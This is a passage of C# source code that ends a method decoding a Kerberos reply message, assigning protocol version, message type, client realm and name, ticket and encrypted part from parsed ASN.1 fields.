                            rep.pvno = sub.Sub[0].GetInteger();
                            break;
                        case 1:
                            rep.msg_type = sub.Sub[0].GetInteger();
                            break;
                        case 3:
                            rep.crealm = sub.Sub[0].GetString();
                            break;
                        case 4:
                            rep.cname = PrincipalName.Decode(sub.Sub[0]);
                            break;
                        case 5:
                            rep.ticket = Ticket.Decode(sub.Sub[0]);
                            break;
                        case 6:
                            rep.enc_part = EncryptedData.Decode(sub.Sub[0]);
                            break;
                    }
                }
            }

            return rep;
        }
    }
}